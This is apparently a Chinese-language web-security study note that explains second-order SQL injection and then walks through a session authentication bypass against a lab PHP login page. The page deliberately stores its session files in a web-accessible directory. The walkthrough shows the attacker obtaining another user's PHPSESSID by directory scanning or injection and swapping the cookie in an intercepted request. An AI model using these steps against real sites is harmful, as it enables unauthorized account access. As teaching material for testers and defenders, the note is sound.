二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。
二次注入是sql注入的一种，但是比普通sql注入利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。

2、原理
二次注入的原理，在第一次进行数据库插入数据的时候，使用了 addslashes 、get_magic_quotes_gpc、mysql_escape_string、mysql_real_escape_string等函数对其中的特殊字符进行了转义，但是addslashes有一个特点就是虽然参数在过滤后会添加 “\” 进行转义，但是“\”并不会插入到数据库中，在写入数据库的时候还是保留了原来的数据。在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。
比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。
二次注入，可以概括为以下两步:

第一步：插入恶意数据
进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。
第二步：引用恶意数据
开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。
配合下图可以有更好的理解:

![img](SQL%E6%B3%A8%E5%85%A5.assets/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aSx5o6n55qE6I-c6bih546p5a62,size_20,color_FFFFFF,t_70,g_se,x_16.png)

## 绕过SESSION_START

1. **session机制**
   	 session机制是一种服务器端的机制，服务器使用一种类似于散列表的结构（也可能就是使用散列表）来保存信息。 注意：session是存在于服务器里，而cookie是存在客户端。

​	当程序需要为某个客户端的请求创建一个session的时候，服务器首先检查这个客户端的请求里是否已包含了一个session标识 - 称为session id，如果已包含一个session id则说明以前已经为此客户端创建过session，服务器就按照session id把这个session检索出来使用（如果检索不到，可能会新建一个）（其实就是在检索一个session文件，里面存储在内容）（这个session文件的命名格式为sess_sessionid号），如果客户端请求不包含session id，则为此客户端创建一个session并且生成一个与此session相关联的session id，session id的值应该是一个既不会重复，又不容易被找到规律以仿造的字符串，这个session id将被在本次响应中返回给客户端保存。

​	保存这个session id的方式可以采用cookie，这样在交互过程中浏览器可以自动的按照规则把这个标识发挥给服务器。

​	session一般用于登录验证。session的机制，是会在浏览器生成一个cookie session_id，也会在服务器里生产一个session id对应的session文件。比如，在做身份证认证的时候就会在这个服务器里的session id对应的文件写入要验证的内容。在php里 session的存放位置是 在php.ini里设置的，也可以通过函数设置在其他位置

2. **session的生命周期**
           默认关闭浏览器，session就会消失，当然了也可以在程序中设置session的过期时间

3. **出现漏洞的情景**
       如果服务器的session-id对应的文件存在网站的其他目录（比如/var/www/html/tmp目录下）（有时会存储在网站根目录下的某目录下），通过扫描目录即可获取 session 文件所在目录，我们即可获取到seesion_id，即可绕过身份验证。如果存放在数据库，可以通注入漏洞获取seesion信息，获取到session_id 就可以修改cookie 进行提交，验证就可以通过。

4. #### **session身份验证绕过示例：**

   **（1）源码：`session.php`**

   【默认帐号和密码：qwsn/123456】

   ```PHP
   <?php
   	$path_parts = pathinfo(__FILE__);
   	$save_seesion=$path_parts['dirname'].'\tmp';
   	session_save_path($save_seesion);
   	session_start();
   	//当用户访问当前的页面的时候就会在tmp目录下生成session_id文件
   	登录后的用户session_id文件内就会存储用户名。
   	
   	$username='qwsn';
   	$password='123456';
   	
   	if($_GET['c']=='login'){
   		if($_SESSION['username']==$username){
   			//检索所有当前的session_id文件内容进行验证，如果文件内存在用户即可登录！！！
   			echo "欢迎回来!{$_SESSION['username']}";
   		}else{
   			if($_POST['username']==$username && $_POST['password']==$password){
   				$_SESSION['username']=$username;
   				isset($PHPSESSID)?session_id($PHPSESSID):$PHPSESSID = session_id();
   				//session_id() 可以用来获取/设置 当前会话 ID
   				setcookie('PHPSESSID', $PHPSESSID, time()+24 * 3600);
   				//设置当前的SESSION的过期时间为24h
   				echo "登录成功 {$_SESSION['username']}";
   			}else{
   				echo "帐号或者密码出错<a href='session.php'>返回</a>";
   			}
   			
   		}
   			
   	}else{
   		echo '<meta charset="UTF-8">';
   		echo"<form method='post' action='?c=login'>";
   		echo"<label>帐号：</label><input type='text' name='username'><br>";
   		echo"<label>密码：</label><input type='password' name='password'><br>";
   		echo"<input type='submit' value='登录' name='submit'>";
   		echo "</form>";
   	}
   ```

   **（2）绕过：抓包改包**
   第一步： 使用qwsn/123456登录后，服务器的/var/www/html/tmp下会存储session id对于的session_id文件，该文件存储着用户名！！！

   如下图所示，http://www.webtester.com/session.php是用户登录页面：

   ![在这里插入图片描述](SQL%E6%B3%A8%E5%85%A5.assets/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXdzbg==,size_20,color_FFFFFF,t_70,g_se,x_16.png)

如下图所示，我们使用qwsn/123456用户登录成功：

![在这里插入图片描述](SQL%E6%B3%A8%E5%85%A5.assets/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXdzbg==,size_20,color_FFFFFF,t_70,g_se,x_16-171333520857320.png)

如下图所示，我们登录成功后，可以通过开发者工具的网络模块发现cookie值：`PHPSESSID=ij11lj0rsir754g01l7um1nuk3`

![在这里插入图片描述](SQL%E6%B3%A8%E5%85%A5.assets/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXdzbg==,size_20,color_FFFFFF,t_70,g_se,x_16-171333521064223.png)

如下图所示，我们在靶机上也发现生成了session_id对应的sess_sessionid文件：sess_ij11lj0rsir754g01l7um1nuk3，其内容是保存的用户名qwsn，只要我们在使用其他用户登录的时候，使用了该sess_sessionid文件的话，那么就可以绕过验证直接登录。这里我们可以使用cookie传值的时候传该文件对应的sessionid即可调用该文件！！！

![在这里插入图片描述](SQL%E6%B3%A8%E5%85%A5.assets/31ad8ad56ffa4dbdaf4146987483c4c1.png)

第二步： 换一个浏览器，然后随便使用不存在的一个用户名和密码，点击登录，抓包，修改包中的cookie数组变量的PHPSESSID的键值为qwsn登录的时候的phpsessid即可绕过登录！！！

如下图所示，我们使用账户qwsn2/asdfghjkl登录，抓包修改cookie的phpsessid键值为qwsn的sessionid【ij11lj0rsir754g01l7um1nuk3】即可绕过登录验证：

![在这里插入图片描述](SQL%E6%B3%A8%E5%85%A5.assets/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXdzbg==,size_20,color_FFFFFF,t_70,g_se,x_16-171333521454628.png)

![在这里插入图片描述](SQL%E6%B3%A8%E5%85%A5.assets/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXdzbg==,size_20,color_FFFFFF,t_70,g_se,x_16-171333521686231.png)

![在这里插入图片描述](SQL%E6%B3%A8%E5%85%A5.assets/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXdzbg==,size_20,color_FFFFFF,t_70,g_se,x_16-171333521981134.png)

![在这里插入图片描述](SQL%E6%B3%A8%E5%85%A5.assets/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXdzbg==,size_20,color_FFFFFF,t_70,g_se,x_16-171333522443937.png)

**（3）总结：**

​     抓包，修改cookie的phpsessid的值为登录成功的用户的sessionid，这个sessionid我们可以通过目录扫描或者SQL注入得到，因为session文件一般是以sess_sessionid号的形式命名的！！！
